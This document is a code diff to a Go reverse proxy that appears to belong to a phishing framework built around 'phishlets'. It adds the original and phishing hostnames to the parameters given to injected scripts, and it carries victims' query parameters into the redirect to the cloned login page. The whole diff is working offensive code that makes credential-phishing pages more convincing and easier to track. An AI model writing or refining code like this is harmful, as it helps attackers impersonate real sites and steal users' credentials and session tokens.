@@ -241,6 +241,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
 							params := map[string]string{
+								"orig_hostname":req.URL.Host,
+								"phish_hostname":string(p.patchUrls(pl, []byte(req.URL.Host), CONVERT_TO_PHISHING_URLS)),
 								"phish_domain":p.cfg.PhishletConfig(pl.Name).Hostname,
 								"tracking_params":EncryptUrlParams("", s.Params),
 							}
@@ -604,11 +606,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if ok {
 							rurl := ReplaceParams(pl.GetLoginUrl(), s.Params)
 							u, err := url.Parse(rurl)
+							q := u.Query()
+							params := req.URL.Query()
+							for k,vs := range params {
+								for _, v := range vs {
+									q.Add(k,v)
+								}
+							}
+							u.RawQuery = q.Encode()
 							if err == nil {
 								if strings.ToLower(req_path) != strings.ToLower(u.Path) {
 									resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 									if resp != nil {
-										resp.Header.Add("Location", rurl)
+										resp.Header.Add("Location", u.String())
 										return req, resp
 									}
 								}
